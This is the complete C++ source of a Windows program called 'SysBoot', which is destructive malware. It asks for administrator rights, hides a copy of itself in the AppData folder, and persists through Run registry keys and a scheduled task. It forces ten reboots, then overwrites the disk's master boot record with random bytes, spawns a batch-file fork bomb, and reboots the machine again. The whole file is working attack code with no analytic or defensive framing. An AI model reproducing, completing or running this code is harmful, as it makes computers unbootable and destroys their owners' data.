#define _WIN32_WINNT 0x0600
#include <windows.h>
#include <bcrypt.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <string>
#include <vector>

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")

#define APP_NAME    L"SysBoot"
#define APP_EXE     L"sysboot.exe"
#define COUNTER_KEY L"RebootCount"
#define MAX_REBOOT  10
#define REASON_KEY  L"FinalStageDone"

static BOOL IsAdmin() {
    BOOL a = FALSE; PSID g = NULL;
    SID_IDENTIFIER_AUTHORITY n = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&n, 2,
        SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
        0,0,0,0,0,0,&g)) {
        CheckTokenMembership(NULL, g, &a);
        FreeSid(g);
    }
    return a;
}

static void Elevate() {
    wchar_t p[MAX_PATH]; GetModuleFileNameW(NULL, p, MAX_PATH);
    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpVerb = L"runas"; sei.lpFile = p; sei.hShow = SW_HIDE;
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    if (!ShellExecuteExW(&sei)) ExitProcess(0);
    ExitProcess(0);
}

static DWORD ReadCounter() {
    HKEY k;
    DWORD v = 0, sz = sizeof(v), type = 0;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\SysBoot",
        0, KEY_READ, &k) == ERROR_SUCCESS) {
        RegQueryValueExW(k, COUNTER_KEY, NULL, &type, (LPBYTE)&v, &sz);
        RegCloseKey(k);
    }
    return v;
}

static void WriteCounter(DWORD v) {
    HKEY k;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\SysBoot",
        0, NULL, 0, KEY_WRITE, NULL, &k, NULL) == ERROR_SUCCESS) {
        RegSetValueExW(k, COUNTER_KEY, 0, REG_DWORD,
            (const BYTE*)&v, sizeof(v));
        RegCloseKey(k);
    }
}

static bool IsFinalDone() {
    HKEY k;
    DWORD v = 0, sz = sizeof(v);
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\SysBoot",
        0, KEY_READ, &k) == ERROR_SUCCESS) {
        RegQueryValueExW(k, REASON_KEY, NULL, NULL, (LPBYTE)&v, &sz);
        RegCloseKey(k);
    }
    return v == 1;
}

static void MarkFinalDone() {
    HKEY k;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\SysBoot",
        0, NULL, 0, KEY_WRITE, NULL, &k, NULL) == ERROR_SUCCESS) {
        DWORD one = 1;
        RegSetValueExW(k, REASON_KEY, 0, REG_DWORD,
            (const BYTE*)&one, sizeof(one));
        RegCloseKey(k);
    }
}

static std::wstring GetInstallPath() {
    wchar_t ad[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, ad);
    std::wstring d = std::wstring(ad) + L"\\Microsoft\\Windows\\SysBoot";
    CreateDirectoryW(d.c_str(), NULL);
    SetFileAttributesW(d.c_str(),
        FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    return d + L"\\" + APP_EXE;
}

static void InstallSelf() {
    wchar_t self[MAX_PATH]; GetModuleFileNameW(NULL, self, MAX_PATH);
    std::wstring target = GetInstallPath();
    if (_wcsicmp(self, target.c_str()) == 0) return;

    CopyFileW(self, target.c_str(), FALSE);
    SetFileAttributesW(target.c_str(),
        FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

    HKEY k;
    const wchar_t* runPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    if (RegOpenKeyExW(HKEY_CURRENT_USER, runPath, 0, KEY_SET_VALUE, &k) == ERROR_SUCCESS) {
        RegSetValueExW(k, APP_NAME, 0, REG_SZ,
            (const BYTE*)target.c_str(),
            (DWORD)((target.length()+1)*sizeof(wchar_t)));
        RegCloseKey(k);
    }
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, runPath, 0, KEY_SET_VALUE, &k) == ERROR_SUCCESS) {
        RegSetValueExW(k, APP_NAME, 0, REG_SZ,
            (const BYTE*)target.c_str(),
            (DWORD)((target.length()+1)*sizeof(wchar_t)));
        RegCloseKey(k);
    }

    std::wstring cmd = L"schtasks /create /tn \"";
    cmd += APP_NAME;
    cmd += L"\" /tr \"\\\"";
    cmd += target;
    cmd += L"\\\"\" /sc onlogon /rl highest /f";

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    CreateProcessW(NULL, (LPWSTR)cmd.c_str(), NULL, NULL, FALSE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (pi.hProcess) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
}

static void ForceReboot() {
    HANDLE t; TOKEN_PRIVILEGES tp;
    if (OpenProcessToken(GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &t)) {
        tp.PrivilegeCount = 1;
        LookupPrivilegeValueA(NULL, SE_SHUTDOWN_NAME, &tp.Privileges[0].Luid);
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(t, FALSE, &tp, 0, NULL, NULL);
        CloseHandle(t);
    }
    ExitWindowsEx(EWX_REBOOT | EWX_FORCE,
        SHTDN_REASON_MAJOR_OTHER | SHTDN_REASON_MINOR_OTHER);
}

static void WipeMBR() {
    HANDLE h = CreateFileA("\\\\.\\PhysicalDrive0",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return;

    BYTE buf[512];
    if (BCryptGenRandom(NULL, buf, 512,
        BCRYPT_USE_SYSTEM_PREFERRED_RNG) == 0) {
        LARGE_INTEGER li = {0};
        SetFilePointerEx(h, li, NULL, FILE_BEGIN);
        DWORD w = 0;
        WriteFile(h, buf, 512, &w, NULL);
        FlushFileBuffers(h);
    }
    CloseHandle(h);
}

static void SpawnForkBomb() {
    wchar_t temp[MAX_PATH];
    GetTempPathW(MAX_PATH, temp);
    std::wstring batPath = std::wstring(temp) + L"bomb.bat";

    HANDLE f = CreateFileW(batPath.c_str(), GENERIC_WRITE, 0,
        NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (f != INVALID_HANDLE_VALUE) {
        const char* content = "@echo off\r\n%0 | %0\r\n";
        DWORD w;
        WriteFile(f, content, (DWORD)strlen(content), &w, NULL);
        CloseHandle(f);
    }

    for (int i = 0; i < 90; ++i) {
        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        std::wstring cmd = L"cmd.exe /c \"" + batPath + L"\"";
        CreateProcessW(NULL, (LPWSTR)cmd.c_str(), NULL, NULL, FALSE,
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        if (pi.hProcess) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
    }
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    if (!IsAdmin()) { Elevate(); return 0; }

    InstallSelf();

    bool finalDone = IsFinalDone();
    DWORD counter = ReadCounter();

    if (!finalDone && counter < MAX_REBOOT) {
        WriteCounter(counter + 1);
        Sleep(1500);
        ForceReboot();
        return 0;
    }

    if (!finalDone && counter >= MAX_REBOOT) {
        WipeMBR();
        SpawnForkBomb();
        Sleep(2000);
        MarkFinalDone();
        ForceReboot();
        return 0;
    }

    while (true) Sleep(60000);
    return 0;
}
